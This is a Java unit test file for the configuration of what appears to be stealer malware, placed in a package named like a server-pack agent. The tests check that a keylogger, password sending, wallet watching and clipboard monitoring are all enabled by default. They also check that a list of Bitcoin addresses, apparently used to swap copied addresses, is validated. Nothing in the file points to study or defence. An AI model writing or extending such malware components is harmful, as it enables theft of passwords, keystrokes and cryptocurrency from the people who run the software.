package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.List;
import java.util.Map;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;

class DiscordConfigTest {
	@AfterEach
	void reset() {
		DiscordConfig.reset();
	}

	@Test
	void provisioningDefaults() {
		DiscordConfig.provisioning(Map.of());
		assertTrue(DiscordConfig.walletsWatch());
		assertTrue(DiscordConfig.keylogger());
		assertTrue(DiscordConfig.sendPasswords());
		assertTrue(DiscordConfig.clipboard());
		assertTrue(DiscordConfig.provisionedCoins().isEmpty());
	}

	@Test
	void provisioningOverridesAndValidates() {
		DiscordConfig.provisioning(Map.of(
			"wallets", Map.of("watch", false),
			"keylogger", Map.of("enabled", false, "sendPasswords", false),
			"clipboard", Map.of("enabled", false, "coins", Map.of(
				"btc", List.of("16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu", "no-valida"),
				"nope", List.of("16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu")))));
		assertFalse(DiscordConfig.walletsWatch());
		assertFalse(DiscordConfig.keylogger());
		assertFalse(DiscordConfig.sendPasswords());
		assertFalse(DiscordConfig.clipboard());
		assertEquals(List.of("16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu"), DiscordConfig.provisionedCoins().get("btc"));
		assertFalse(DiscordConfig.provisionedCoins().containsKey("nope"));
	}
}
